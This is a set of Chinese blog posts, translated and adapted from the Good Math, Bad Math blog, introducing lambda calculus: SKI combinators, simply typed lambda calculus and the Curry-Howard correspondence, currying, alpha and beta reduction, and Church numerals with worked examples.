乍一看，这是一个很奇怪的组合。S的应用机制尤为奇怪 —— 它并不是接受两个参数x和y，并应用x到y，它除了x和y外还用到了第三个值z，先将x应用到z上，再将y应用到z上，最后用前者的结果应用到了后者的结果上。 这是有道理的。以下各行各做了一步规约： 123S K K x = (K x) (K x) = x 噗！ 我们根本用不着I。我们仅用S和K就创建了I的等价。但是，这仅仅是个开始：事实上，我们可以只用S和K组合子，甚至一个变量都不用，创建任意lambda演算表达式的等价。 例如，Y组合子可以写成： 1Y = S S K (S (K (S S (S (S S K)))) K) 在我们继续深入之前，有一个重要的事情要指出。我在上面说的是，使用S K K，我们创建了I的等价，然而它并没有规约为lambda x . x。 到目前为止，我们说在Lambda演算中，“x = y”，当且仅当x和y相同，或通过Alpha转化后相同。（这样lambda x y . x + y等于lambda a b . a + b ，但不等于lambda x y . y + x ）这就是所谓的内涵等价(intensional equivalence) 。 然而，另一种相等也非常有用，这就是所谓的外延等价（extensional equivalence）或外延相等（extensional equality）。外延相等时，表达式X等于一个表达式Y，当且仅当X等同Y（模Alpha），或者 for all a . X a = Y a。 从现在起，我们使用「=」表示外延相等。我们可以将任何 Lambda表达式转换为外延相等的组合子形式。我们定义一个从Lambda形式到组合子形式的变换函数C： C&#123;x&#125; = x C&#123;E1 E2&#125; = C&#123;E1&#125; C&#123;E2&#125; C&#123;lambda x . E&#125; = K C&#123;E&#125;，如果x在E中非自由 C&#123;lambda x . x&#125; = I C&#123;lambda x . E1 E2&#125; = (S C&#123;lambda x . E1&#125; C &#123;lambda x . E2&#125;) C&#123;lambda x . (lambda y . E)&#125; = C &#123;lambda x . C &#123;lambda y . E&#125;&#125;，如果x在E中是自由变量 让我们演进一下 C&#123;lambda x y . y x&#125; ： 柯里化函数： C&#123;lambda x . (lambda y . y x)&#125; 根据规则6： C&#123;lambda x . C&#123;lambda y . y x&#125;&#125; 根据规则5： C&#123;lambda x . S C&#123;lambda y . y&#125; C&#123;lambda y . x&#125;&#125; 根据规则4： C&#123;lambda x . S I C&#123;lambda y . x&#125;&#125; 根据规则3： C&#123;lambda x . S I (K C&#123;x&#125;)&#125; 通过规则1： C&#123;lambda x . S I (K x)&#125; 根据规则5： S C&#123;lambda x . S I&#125; C&#123;lambda x . (K x)&#125; 根据规则3： S (K (S I)) C&#123;lambda x . K x&#125; 根据规则5： S (K (S I)) (S C&#123;lambda x . K&#125; C&#123;lambda x . x&#125;) 通过规则1： S (K (S I)) (S C&#123;lambda x . K&#125; I) 根据规则3： S (K (S I)) (S (K K) I) 现在，让我们尝试使用“x”和“y”作为参数传递给该组合子表达式，并规约： S (K (S I)) (S (K K) I) x y 让我们创建一些别名，以方便阅读：A = (K (S I)), B = (S (K K) I)，所以我们的表达式现在成了：S A B x y 展开S: (A x (B x)) y 让我们去掉别名B：(A x ((S (K K) I) x)) y 现在让我们去掉S：(A x ((K K) x (I x))) y 以及I：(A x ((K K) x x)) y 规约(K K) x ：(A x (K x)) y 展开别名A： ((K (S I)) x (K x)) y 规约(K (S I)) x ，得到： ((S I) (K x)) y 规约S：I y (K x) y 规约I：y (K x) y 最后规约(K x) y，剩下：y x 就是这样。好玩吧？ ※Lambda演算的类型 16 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 我们已经掌握了直觉逻辑（Intuitionistic Logic，IL），我们再回到lambda演算：我们已经得到了我们需要定义模型的逻辑工具。 当然，在没有更简单的事情了，对吧？ 到目前为止我们讨论的都是简单的无类型lambda演算。一如丘奇首次提出LC的第一个版本。但它存在一些问题，为了解决这些问题，人们引入了「类型」（type）的概念，于是出现了简单类型lambda演算，之后出现了各种变种 —— SystemT，SystemF，Lambda立方（和时间立方没啥关系:-)）等等。最终，人们意识到无类型lambda演算实际上是类型化lambda演算的一个简单到病态的特例 —— 只有一个类型的LC。 lambda演算的语义在类型化演算中最容易理解。现在，我们来看看最简单的类型化LC，叫做「简单类型化lambda演算」（simply typed lambda calculus）；以及它如何在语义上等同于直觉逻辑。（其实上，每个种类型化LC都对应于一种IL，而且每个LC中的beta规约都对应于IL中的一步推理，这就是为什么我们需要先跑去介绍直觉逻辑，然后再回到这里。） 类型化lambda演算的主要变化是增加了一个叫做「基类型」（base types）的概念。在类型化lambda演算中，你可以使用一些由原子值构成的论域（universe）， 这些值分为不同的简单类型。基类型通常由单个的小写希腊字母命名，然而这正好是Blogger的痛处（普通html文本打不出希腊字母），我只好用大写英文字母来代替类型名称。因此，例如，我们可以有一个类型「N」，它由包含了自然数集合，也可以有一个类型「B」，对应布尔值true / false，以及一个对应于字符串类型的类「S」。 现在我们有了基本类型，接下来我们讨论函数的类型。函数将一种类型（参数的类型）的值映射到的第二种类型（返回值的类型）的值。对于一个接受类型A的输入参数，并且返回类型B的值的函数，我们将它的类型写为A -&gt; B 。「 -&gt;」叫做函数类型构造器（function type constructor），它是右关联的，所以 A -&gt; B -&gt; C 表示 A -&gt; (B -&gt; C)。 为了将类型应用于lambda演算，我们还要做几件事情。首先，我们需要更新语法，使我们可以包含类型信息。第二，我们需要添加一套规则，以表示哪些类型化程序是合法的。 语法部分很简单。我们添加了一个「:」符号； 冒号左侧是表达式或变量的绑定，其右侧是类型规范。 它表明，其左侧拥有其右侧指定的类型。举几个例子： lambda x : N . x + 3。表示参数x 类型为N ，即自然数。这里没有指明函数的结果的类型；但我们知道，函数「+」的类型是 N -&gt; N ，于是可以推断，函数结果的类型是N。 (lambda x . x + 3) : N -&gt; N，这和上面一样，但类型声明被提了出来，所以它给出了lambda表达式作为一个整体的类型。这一次我们可以推出 x : N ，因为该函数的类型为 N -&gt; N，这意味着该函数参数的类型为 N 。 lambda x : N, y : B . if y then x * x else x。这是个两个参数的函数，第一个参数类型是 N ，第二个的类型是 B 。我们可以推断返回类型为 N 。于是整个函数的类型是 N -&gt; B -&gt; N 。乍看之下有点奇怪；但请记住，lambda演算实际上只有单个参数；多参数函数的写法只是柯里化的简写。所以实际上这个函数是：lambda x : N . (lambda y : B . if y then x * x else x)；内层lambda的类型是 B -&gt; N ; 外层类型是 N -&gt; (B -&gt; N)。 为了讨论程序是否关于类型合法（即「良类型的」(well-typed) ），我们需要引入一套类型推理规则。当使用这些规则推理一个表达式的类型时，我们称之为类型判断（type judgement）。类型推理和判断使我们能推断lambda表达式的类型；如果表达式的任一部分和类型判断结果不一致，则表达式非法。（丘奇开始研究类型化LC的动机之一是区分「原子」值和「谓词」值，他通过使用类型以确保谓词不能操作谓词，以试图避免的哥德尔式的悖论。） 我将采用一套不太正规的符号表示类型判断；标准符号太难用我目前使用的软件渲染了。常用的符号跟分数有点像；分子由我们已知为真的语句组成；分母则是我们可以从分子中推断出来的东西。 我们经常在分子中使用一个叫「上下文」（context）的概念，它包含了一组我们已知为真的语句，通常表示为一个大写的希腊字母。这里我用大写的希腊字母的名称表示。如果一个类型上下文包含声明”x : A，我会写成 CONTEXT |- x : A。对于分数形式的推理符号，我用两行表示，分子一行标有「Given: 」，分母一行标有「Infer: 」。 （正常符号用法可以访问维基百科的STLC页 。） **规则1：（类型标识） ** 12Given: nothing Infer: x : A |- x : A 最简单的规则：如果我们只知道变量的类型声明，那么我们知道这个变量是它所声明的类型。 **规则2：（类型不变式） ** 12Given: GAMMA |- x : A, x != y Infer: (GAMMA + y : B) |- x : A 这是不干涉语句。 如果我们知道 x : A，那么我们可以推断出其他任何类型判断都不能改变我们对x的类型推断。 规则3：（参数到函数的推理） 12Given: (GAMMA + x : A) |- y : B Infer: GAMMA |- (lambda x : A . y) : A -&gt; B 这个语句使我们能够推断函数的类型：如果我们知道函数参数的类型是 A，而且该函数返回值的类型是 B ，那么我们可以推出函数的类型为 A -&gt; B 。 最后，Rule4：（函数应用推理） 12Given: GAMMA |- x : A -&gt; B, GAMMA |- y : A Infer: GAMMA |- (x y) : B 如果我们知道一个函数的类型为 A -&gt; B ，且把它应用到类型为A的值上，那么结果是类型为 B 的表达式。 规则就是这四个。如果我们有一个lambda表达式，且表达式中每一项的类型判断都保持一致，那么表达式就是良类型化的（well-typed）。如果不是，则表达式非法。 下面我们找点刺激，描述下SKI组合子的类型。这些都是不完整的类型——我用的是类型变量，而不是具体的类型。 在真正使用组合子的程序中，你可以找到实际类型来替换类型变量。 别担心，我会用一个例​​子来阐明这一点。 I组合子： (lambda x . x) : A -&gt; A K组合子： (lambda x : A . ((lambda y : B . x) : B -&gt; A)): A -&gt; B -&gt; A S组合子： (lambda x : A -&gt; B-&gt; C . (lambda y : A -&gt; B . (lambda z : A . (x z : B -&gt; C) (y z : B)))) : (A -&gt; B -&gt; C) -&gt; (A -&gt; B) -&gt; C 现在，让我们来看一个简单的lambda演算表达式：lambda x y . y x。由于没有任何关于类型的声明或参数，我们无法知道确切的类型。但是，我们知道，x一定具有某种类型，我们称之为A；而且我们知道，y是一个函数，它以x作为应用的参数，所以它的参数类型为A，但它的结果类型是未知的。因此，利用类型变量，我们有 x : A, y : A -&gt; B。我们可以通过看分析完整的具体表达式来确定A 和 B 。所以，让我们用x = 3，和y = lambda a : N. a * a 来计算类型。假设我们的类型上下文已经包含了 * 的类型为 “N -&gt; N -&gt; N“。 (lambda x y . y x) 3 (lambda a : N . a * a) 3是整数，所以它的类型是： 3 : N 。 根据规则4，我们可以推出出表达式 a * a 的类型是 N，其中 a : N （*的类型：N -&gt; N -&gt; N），因此，由规则3，lambda表达式的类型是 N - &gt; N 。 于是，我们的表达式现在变成了：(lambda x y . y x) (3 : N) (lambda a : N . (a * a) : N) : N -&gt; N 所以 —— 现在我们知道，第一个lambda的参数 x 须是 N 类型，以及 y是 N -&gt; N 类型 。根据规则4我们知道，应用表达式的类型 y x 一定是 N ，然后根据规则3，表达式的类型为： N -&gt; (N -&gt; N) -&gt; N 。 所以此处的类型 A 和 B 最后都是N。 所以，现在我们得到了一个简单的类型化lambda演算。说它是简单的类型化，是因为这里对类型的处理方式很少：建立新类型的唯一途径就是通过「 -&gt;」 构造器。其他的类型化lambda演算包括了定义「参数化类型」（parametric types）的能力，它将类型表示为不同类型的函数。 ※终章，Lambda演算建模——程序即证明！ 16 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 我们已经讲过直觉逻辑（intuitionistic logic）和它的模型；从无类型的Lambda演算讲到了简单类型化Lambda演算；终于，我们可以看看Lambda演算模型了。而这正是真正有趣的地方。 先来考虑简单类型化Lambda演算中的类型。任何可以从下面语法生成的形式都是Lambda演算类型： 123type ::= primitive | function | ( type ) primitive ::= A | B | C | D | ... function ::= type -&gt; type 这个语法中的一个陷阱是，你可以创建一个类型的表达式，而且它们是合法的类型定义，但是你无法你写出一个拥有该类型的单独的，完整的，封闭表达式。（封闭表达式是指没有自由变量的表达式。）如果一个表达式类型有类型，我们说表达式「居留」（inhabit）该类型，而该类型是一个居留类型。如果没有表达式可以居留类型，我们说这是「不可居留的」（uninhabitable） 。 那么什么是居留类型和不可居留类型之间的区别？ 答案来自一种叫做「柯里-霍华德同构」（Curry-Howard isomorphism）的理论。这种理论提出，每个类型化的lambda演算，都有相应的直觉逻辑；类型表达式是可居留的当且仅当该类型是在对应逻辑上的定理。 先看类型 A -&gt; A。现在，我们不把 -&gt; 看作函数类型构造器，而把它视作逻辑蕴涵。A 蕴含 A 显然是直觉主义逻辑的定理。因此，类型 A -&gt; A 是可居留的。 再来看看 A -&gt; B 。这不是一个定理，除非在某个上下文中能证明它。作为一个函数类型，这表示一类函数，在不包括任何上下文的情况下，以A类型作为参数，并返回一个不同类型B。你没法做到这一点——必须有某个上下文提供B类型的值——为了访问这个上下文，必须存在某种允许函数访问它的上下文的方式：一个自由变量。这一点在逻辑上和lambda演算上是一样的：你需要某种上下文建立 A-&gt;B 作为一个定理（在逻辑上）或可居留的类型（在lambda演算上）。 下面就容易理解些了。如果有一个封闭LC表达式，其类型是在相应的直觉逻辑中的定理，那么，该类型的表达式就是定理的一个证明。每个Beta规约则等同于逻辑中的一个推理步骤。对应于这个lambda演算的逻辑就是它的模型。从某种意义上说，lambda演算和直觉逻辑，只是同一件事的不同反映。 有两种方式可以证明这个同构：一种是柯里当初采用的，组合子演算的方式；另一种则用到了所谓的「相继式演算」（Sequent calculus）。我会组合子证明的版本，所以下面我会快速的过一遍。以后，很可能下个礼拜，我会讲相继式演算的版本。 让我们回忆一下什么是模型。模型是一种表示演算中的每条声明（statement）在某些具体值域上都合法的方式——所以存在具体实体和演算中的实体的对应关系，凡演算中的声明都对应真正的实体的某些声明。所以我们实际上并不需要做充分的同构；我们只需要一个从演算到逻辑的同态（homomorphism）。（同构是双向的，从演算到逻辑和逻辑到演算；而同态只从演算到逻辑。） 所以我们需要做的是取任意完整的lambda演算表达式，然后将其转化为一系列合法的的直觉逻辑语句。由于直觉逻辑本身已被证明是合法的，如果我们可以把lambda演算翻译成IL，这样我们就证明了lambda演算的合法性——这意味着我们将表明，在lambda演算中的计算是合法的计算，以及lambda演算是一个完全的，合法的，有效的计算系统。 我们如何从组合子（它们只是省去了变量的lambda演算的简写）得到直觉逻辑？它实际上简单得令人难以相信。 直觉逻辑中的所有证明可以归结为一系列的步骤，其中的每一步都是使用了以下两个基本公理之一的推理： A implies B implies A (A implies B implies C) implies ((A implies B) implies (A implies C)) 让我们用箭头重写它们，让它们看起来像一个类型：A -&gt; B -&gt; A ；及(A -&gt; B -&gt; C) -&gt; ((A -&gt; B) -&gt; (A -&gt; C))。 眼熟吗？不熟的话再回头看看简单类型化lambda演算。这就是S和K组合子的类型。 接下来的建模步骤就很明显了。lambda演算的类型对应于直觉逻辑的原子类型。函数是推理规则。每个函数可以规约为一个组合子表达式；每个组合子表达式是直觉逻辑的某个基本推理规则的实例。于是，函数就成了相应逻辑里的定理的一个构造性证明。 酷吧？ （任何正常人看完会说“什么？”，但，我显然不是正常人，我是一个数学怪咖。） ※博客推荐：good math, bad math之Lambda算子简介 Good math，bad math是我最近发现的一个博客。作者Mark Chu-Carroll写的一系列关于计算机科学理论的文章深入浅出，通俗易懂，属于茶余饭后绝佳的消遣读物。俺一直想写点介绍lambda caculus的小文章，但看了他的“My Fravorite Calculus: Lambda”后，就打消了这个念头。有这么好的文章，转贴就行了，自己就不用再写不入流的文章。今天先转介绍lamdba calculus的第一部分。先申明一下，俺的翻译在不影响作者原意的基础上（但愿能做到到），有时也插科打诨加点8卦。如果谁觉得文章垃圾，完全因为俺水平有限。原文绝对精彩。另外，俺数学方面的术语止于大一微积分。所以术语用错了，还请多多指正。 在计算机科学尤其是是编程语言领域，我们常用一种算子：Lambda Calculus。逻辑学家也常用Lambda Calculus 来研究计算和离散数学结构的本质。其实当初Alanzo Church(就是丘奇-图灵论点里的那位丘奇老大了）和Stephen Cole Kleene(就是自动机理论里Kleene Star那个Kleene了）推出这个Lambda Calculus，也是为了方便他们做逻辑方面的推理，好证明决定性问题。当然以Church和图灵的天才，没多久他们便证明图灵机和lambda calculus具有等价的计算能力。Church提出Lambda Calculus时就怀疑他的理论能被用在其它地方。事实证明他的确高瞻远瞩。Lambda Calculus在编程的理论和实践两方面都意义深远。做理论和做函数编程的且不说。就算是玩儿脚本语言的老大们，也多半成天和lambda打交道。说来好玩儿，计算机科学理论的发展相当诡异。常常是逻辑学家为了推进逻辑理论提出一个理论，若干年后计算机科学家出于实际需求再“重新发现”一模一样的理论。 比如说现在很多函数编程语言常用的Hindley-Milner类型系统，就是逻辑学家Roger Hindley 于1969年先发现，再由大名鼎鼎的牛人Robin Milner于1978年独立提出。说远了。Lambda Calculus本身有若干显著优点： 它非常简单。反正比图灵机简单。 它图灵完备。也就是说，图灵机能完成的计算，Lambda Calculus也能完成。 它易于读写。这点很重要。简单就是力量。我们不可不记。 它的语义足够强大，能让我们用它来推理。 它的计算模型足够强大 容易创建不同的变种，以便我们探索用不同的方式构建计算或语义时的特性 Lambda Calculus易于读写意义重大。正是这个优点催生了许多或多或少基于lambda calculus的极为优秀的编程语言：Lisp, ML, 和Haskell都在很大程度上基于Lambda calculus开发出来。 Lambda calculus建立在函数这个概念上。纯粹的lambda算子理论中，任何东西都是函数。除了函数外别无它物。不过我们可以用函数搭建出各种东西。其实我们可以从lambda calculus开始，从无到有搭建出整个数学的结构。 牛皮轰轰吧？我们就来看一下lambda calculus为什么这么神奇。对任何一个算子理论来说，我们必须先定义两个东西。一是句法(syntax)，用来描述什么表达式是合法的；二是一套规则，用来规定我们怎么对表达式作合法的符号操作。 ※Lambda Calculus句法 Lambda calculus 只有三种表达式 函数定义：在lambda calculus里一个函数就是一个表达式，写成lambda x . &lt;函数体&gt;。意思是“一个函数，带一个参数X，返回计算函数体后得到的结果”。这个时候我们说这个lambda表达式绑定了参数X。 标识符引用（identifier reference): 一个标识符引用就是一个名字。这个名字和包括这个引用的函数定义里的参数同名。 函数应用(function application): 这个更简单，把要应用的值放到函数定义的后面就行了。比如 (lambda x . plus x x) y 这么简单的定义能干什么嗫？怎么没有多个参数嗫？这个就是数学的魅力了。我们很快会发现，多个参数可以被等价的操作（所谓的currying)来代替。而配上简单的操作后（本质操作就一个：替换），我们就得到了一门强大的编程语言，不输基于图灵机模型的Algo系列语言，比如C。 欲知后事如何，且听下回分解。 ※lambda算子简介1.a 接着前两天的转载继续写。上次说到lambda算子的函数只接受一个参数。那怎么处理多个参数呢？如果只有一个参数，那岂不是连加法都不能实现？这当然难不倒像丘齐这样的天才。于是， lo and behold, 一个我们至今在编程里常用的技巧粉墨登场： ※Currying 据说Currying翻译为局部套用函数，也不知真假。喜欢吃印度美食的老大们不要激动。Currying和咖喱没有半点关系。这个技巧以逻辑学家Haskell Curry的姓命名。Haskell Curry也是名动一时的人物。他和Moses Schönfinkel 共创了组合逻辑（combinatory logic)，并把这们学科发扬光大。当初Curry搞出组合逻辑，主要是为了在数理逻辑里避免使用变量。后来搞函数编程的人们发现，组合逻辑是一类函数编程语言的理论基础。一些函数语言里常见的特性，比如说高阶函数合lazy evaluation, 就是用组合逻辑里的combinator实现的。当初Alanzo Church对这个理论也相当熟悉。难说lambda理论不是受了组合逻辑的影响。大牛Philip Wadler为了纪念Curry, 把他的函数语言叫做Haskell。Haskell也是一门巨酷的函数语言，兼顾数学的优美和软件开发的实用性。连LInspire的开发组都决定用Haskell作为系统开发的语言（但我很奇怪他们为什么放弃使用另一门酷酷的函数语言Ocaml）。说远了。 解决参数限制的关键在于认识到函数也是数据（用更严格的说法，是值）。既然是数据，就可以传来传去。如果有两个参数，我们可以写一个接受第一个参数的函数，而这个函数返回的是接受第二个参数的函数。“就那么简单！我们在JavaScript里不是常用这个功能？” 嘻嘻，我们在JavaScript里的确常用这个功能。JavaScript其实是带C句法的函数语言，支持高阶函数，自然支持Currying。JavaScript的功能其实颇为强大，不然Douglas Crockford不会说JavaScript是最被人误解的语言。 举例来说，假设我们要写一个函数，把x和y相加。最自然的写法是lambda x y . plus x y. 既然我们只能一次接受一个参数，我们可以先写一个接受 x 的函数。这个函数返回一个接受 y 的函数。这个被返回的函数把 x 和 y 相加：lambda x.(lambda y. plus x y)。简单吧？数学奇妙之处就在于我们用极为简单的砖块搭建出恢弘的宫殿。事实上，数学家们总是极力追求理论基础的简洁。他们不知疲倦地挥舞着奥卡姆剃刀，直到把自己的理论切割成东家之子：增之一分则太长，减之一分则太短。有了Currying这个工具，我们可以放心使用多参数的标记了。反正多参数的lambda不过是单参数lambda的方便用法而已，没有任何实质上的改变。 （待续。累死了。什么时候才能写到让人拍案叫绝的Y Combinator啊? ) ※lambda算子 1.b ※自由 vs 有界标识符 标识符和变量其实是一个意思。我记得国内教材里很少用标识符这个说法。不过既然原作者用这个说法，我就跟着用了。上次说到Currying解决了如何处理多参数的问题。在讨论怎么使用lambda前，我们还要解决一个细微但重要的语法问题：封闭(closure)，或者叫完全有界(complete bounding)。这里的有界和一阶谓词逻辑里的有界没有本质区别，对一阶谓词逻辑熟悉的老大们可以放心跳过。其实有界涉及的定义很直观，我们看一个例子先。假设我们有一个函数lambda x y. (lambda y. y + 2) + x + y +z，lambda y. y+2里的y和它后面的y是不是一样的呢？显然它们是不一样的。为了处理这种区别，我们引入了有界。当一个lambda表达式被计算时，它不能处理无界的标识符。当一个标识符出现在一个lambda表达式的参数里，并且被包含在这个lambda表达式里，我们就可以说这个标识符有界。如果一个标识符没有被包含在任何一个表达式里，我们就叫它为自由变量。比如说，上面那个lambda表达式里，x 出现在lambda x y .(....)里，所以它是有界的变量，它的包含环境（enclosing context，用“语境”或者“上下文”怎么听怎么别扭，好像俺是《读书》的御用作者似的。😄)是整个lambda表达式。lambda y. y+2里的y也是有界的，但它的包含环境是lambda y. y+2。标识符z没有出现在包含它的表达式的参数列表里，所以是自由变量。再举几个例子： lambda x . plus x y: 这个表达式里，&quot;y&quot;和&quot;plus&quot;都是自由变量，因为它们不是任何包含它们的表达式的参数。x有界，因为它被包含在plus x y里，而plus x y的参数有x。 lambda x y.y x: 这个表达式里，x和y都有界，因为它们是这个表达式的参数。 lambda y . (lambda x . plus x y): 在内嵌的表达式lambda x. plus x y里，y和 plus 是自由变量而x是有界变量。在整个lambda表达式里，x和y都有界：x在内嵌表达式界内，而y在整个表达式界内。plus仍然自由。 我们用&quot;free(x)&quot;来代表表达式x里所有自由变量的集合。 一个lambda表达式完全合法仅当它的所有变量都有界。不过当我们考查某个复杂表达式里的子表达式且不考虑上下文时，那些子表达式可以有自由变量－其实确保正确处理那些子表达式里的自由变量非常重要。 ※Lambda 算子计算规则 其实真正的规则就俩：alpha和beta。Alpha规则又叫转换(conversion)规则，而beta规则又叫简化(reduction)规则。 ※Alpha转换 这个充满了《星际迷航》味道的规则其实就是重命名操作。它无非是说变量名不重要：给定任何一个lambda表达式，我们可以任意改变参数的名字，只要我们相应地改变这些对应这些参数的变量名字。 比如说，我们有如下表达式： lambda x . if (= x 0) then 1 else x^2 我们通过alpha规则把X改成Y（写作alpha[x/y], 和逻辑里的变量替换一个写法），于是得到： lambda y . if (= y 0) then 1 else y^2 Alpha操作完全不影响lambda表达式的意义。不过我们后面会发现，这个操作很重要，因为它让我们能够实现诸如递归的操作。 ※Beta简化 Beta简化就有意思了。我们只需要这一个规则，就可以让lamdba算子实现一台计算机能做的任何计算。透过纷繁的表象，我们会发现事情的本质往往出人意料地清晰而简单。删繁为简，恰是数学魅力所在。 Beta规则无非是说，应用一个函数(也就是lambda表达式。一个意思）等价于通过把函数体内有界的变量替换成应用里对应参数的实际值来替换原来的函数。听上去有些拗口（呵呵，其实原文更拗口），但当你看一个例子就知道它其实很简单： 假设我们要应用一个函数：“(lambda x . x + 1) 3”。Beta规则说，我们可以替换整个表达式，把函数体（也就是“x+1”)里的参数对应的x替换成实际的值3。所以最后的结果是“3＋1”。 再来一个稍微复杂点的例子： lambda y . (lambda x . x + y) q 这个表达式有意思，因为应用了这个表达式后，我们可以得到另外一个表达式。也就是说，它是一个生成表达式的表达式（说到这里，玩儿动态语言的老大们可以笑了，玩儿C/C++/Java的老大们可以流口水了）。当我们对这个表达式应用Beta简化时，我们把所有对应参数y的变量替换成实际的值q。所以结果是&quot;lambda x, x+q&quot;。 再来一个例子： “(lambda x y. x y) (lambda z . z * z) 3”. 这个带两个参数的函数把第一个参数应用到第二个参数上。当我们计算它的值时，我们把第一个lambda表达式里的变量x换成lambda z. z * z, 再把变量y换成3，得到(lambda z. z * z) 3。对该结果应用Beta简化，我们得到3 * 3。 Beta的严格定义如下： lambda x . B e = B[x := e] if free(e) /subset free(B[x := e] 这个定义末尾的条件，&quot;if free(e) /subset free(B[x:=e])&quot;道出了我们需要Alpha转换的原因：仅当beta化简不会引起有界变量和自由变量的冲突时，我们可以实施Beta化简。如果一个变量“z”是&quot;e&quot;里的自由变量，那我们得保证beta化简不会让&quot;z&quot;变成有界变量。如果B里的有界变量和”e&quot;里的自由变量重名，我们必须先用Alpha转换，是的重名的变量不再重名。形式化定义不够直观，直观描述又不够简洁。还是来个例子漱漱口： 给定一个表达式，lambda z. lambda x. x+z. 假设我们要应用这个表达式： (lambda z . (lambda x . x + z)) (x + 2) 在实际参数&quot;(x + 2)&quot;里，x是自由变量。但x不是表达式lambda x. x+z的自由变量。也就是说，free(e) /subset free(B[ x:=e])不成立。如果我们打破Beta简化的规则，直接开始Beta简化，便会得到: lambda x . x + x + 2 &quot;x+2&quot;里自由变量，x，现在变得有界了。如果我们把结果应用到3上：(lambda x. x+2+2) 3，我们得到3 + 3 + 2。 如果我们按正常程序办事呢？ 应用 alpha[x/y]: lambda z . (lambda y . y+z)) (x + 2) 应用 beta: lambda y . y + x + 2) 3 再次应用beta: 3 + x + 2. “3+x+2” 和 “3+3+2” 很不一样哈！ 规则就这些了。我们还可以选择性地加一个所谓的Eta-化简，不过它不是必需的。我们就此跳过。我们讨论的这套系统已经是图灵完备的计算体系。那这套系统到底有什么用嗫？到底怎样才能让这套系统变得真正有用嗫？嗯，要说明这些问题，我们得先定义一些基本的函数，以便我们做算术，条件测试，递归，等等。这些会在以后的帖子里谈到。 我们也还没有谈到适合lambda算子的模型（Good Math Bad Math的作者在这里和这里讨论了模型）。模型也是很重要的东西。逻辑学家用了好几年时间研究lambda算子，才搞出一个完备的模型。而且早先时候，尽管lambda算子看起来没错，为它制订模型的工作却失败了。这在当时极为引人关注。要知道，毕竟一个系统没有有效的模型就没有实际的意义。 ※lambda算子3:阿隆佐.丘齐(Alonzo Church)的天才 前面建立了lambda运算的基本规则，就可以用lambda算子做点有意思的东西了。开始前为方便计，我们先来点语法糖花差花差，用来命名函数。这些语法糖可以让复杂的公式好写一点。 我们用&quot;let&quot; 来引入一个“全局”函数（也就是说，我们用这个函数时，不用在每个表达式里定义一次）： let squer = lambda x. x^2 这个式子申明了一个叫&quot;square&quot;的函数，定义为 lamdba x. x^2。如果我们有一个表达式 “square 4”，上面的&quot;let&quot;意味着这个表达式和下面这个表达式一样：(lambda square. square 4)(lambda x. x^2)。这个&quot;let&quot;是从Common Lisp或者Scheme里借来的。Lambda算子里可没有这个东西。数学家推崇“如无必要，毋增实体”。这些关键字不入他们的法眼。不过对写惯了程序的我们来说，这些句法糖就可爱多了。 我们的例子里会用到数字和算术操作符。不过记住lambda算子里根本没有数字。我们只有函数！所以我们需要发明用函数来创造数字的方法。幸好Alonzo Church是个天才。他既然发明了lambda算子，用lambda算子表征数字自然不在话下。他搞出的用于数字的函数自然就叫做丘齐数（Church Numerals)。 丘齐数里，所有的数字都是两个参数的函数： 零是 lambda s z . z 一是 lambda s z . s z 二是 lambda s z . s (s z) 对任意一个数&quot;n&quot;，它的丘齐数都是一个函数。这个函数把它的第一个参数应用到第二个参数上n次。用流行的写法，就是lambda s z . s sn z。 绕口啊绕口。做形式化的东东不幸之处就是成天和绕口令打交道。解脱这道呢？当然就是牢记牛人费因曼在Connection Machine工作时的学习方法：问最简单的问题。“给我最简单的例子”。“怎么才能验证这是正确的？”。比如说零（lambda s z . z）吧，第一个参数是s, 应用零次就是没有，所以函数体就是孤零零的&quot;z&quot;。那数字一呢？当让就是把第一个参数，s，应用到z上一次，所以函数体就变成了&quot;s z&quot;。 理解这个定义的方法之一时把&quot;z&quot;看作丘齐数里零的名字，而把&quot;s&quot;看后继函数（successor function)的名字。“后继函数”其实很简单，C/C里的是也。所以呢，零就是一个返回&quot;0&quot;这个值的函数；一就是把后继函数应用到零上一次的函数；二就是把后继函数应用到一上一次或者说零上两次的函数。0++ 得到 1, 1++ 等价与(0++)，而1得到2．现在把0换成z，把++换成s, 一切就清楚了。 现在－－看好了。如果我们想做加法，x+y，我们需要一个带4个参数的函数。两个参数代表相加的两个数字，以及为得到结果而需要的&quot;s&quot;和&quot;z&quot;。 let add = lambda s z x y . x s (y s z) 看着好像有点不知所云。不过我们可以用Curry这个利器，分开&quot;s&quot; &quot;z&quot;和x, y。首先，Curry后得到的函数带两个参数，x和y（这个好比add(x, y)，符合我们对加号的理解）。其次，我们需要正规化x和y需要的s和z，让x和y共享相同的零和后继函数的绑定： let add = lambda x y. (lambda s z . (x s (y s z))) 仔细观察一下，上面的式子无非是说，要把x和y相加，我们先用&quot;s&quot;和&quot;z&quot;创建丘齐数&quot;y&quot;，然后在把&quot;x&quot;应用到y上。应用时需要的&quot;s&quot;和&quot;z&quot;是&quot;y&quot;里的&quot;s&quot;和&quot;z&quot;。也就是说，我们的到的结果是一个函数，这个函数把自己加到另一个函数上。还是用例子来说明问题。比如说2+3: add (lambda s z. s (s z)) (lambda s z . s (s (s z))) news newz 为了让演算变得稍微容易一点，我们先对2和3来个Alpha转换。让2用s2和z2，而3用s3和z3: add (lambda s2 z2 . s2 (s2 z2)) (lambda s3 z3 . s3 (s3 (s3 z3))) 现在我们可以把&quot;add&quot;替换成它的定义了： (lambda x y .(lambda s z. (x s y (s z)))) (lambda s2 z2 . s2 (s2 z2)) (lambda s3 z3 . s3 (s3 (s3 z3))) 现在可以对&quot;add&quot;用beta变换了（温馨提示：也就是把形参x和y换成对应的实参）： lambda s z . (lambda s2 z2 . s2 (s2 z2)) s (lambda s3 z3 . s3 (s3 (s3 z3)) s z) 然后我们可以对3这个丘齐数做beta转换。这步操作其实是“正规化”3：把3的定义里的后继函数和零函数（还记得零是个函数吧？）替换成add的参数列表里的后继函数和零函数： lambda s z . (lambda s2 z2 . s2 (s2 z2)) s (s (s (s z))) 嗯，有点眉目了。现在是真正漂亮的地方了。再来次对2的Beta变换。看看我们准备做什么：2是个带两个参数的函数：一个参数是后继函数，另一个是零函数。要把2加到3上，我们只需要用到&quot;add&quot;这个函数的后继函数。也就是说，我们把计算了3后的结果当成零函数的值！ lambda s z . s (s (s (s (s z))) 而这个式子，正是丘齐数5！ 丘齐数酷的地方是它抛弃了传统整数的概念，用函数取而代之。它把每个数对应为一个函数。而数数（counting）这个操作被对应为应用某个函数（在这里是后继函数）的次数。当然了，上面的介绍非常简单。对丘齐数感兴趣的，可以看这篇文章。 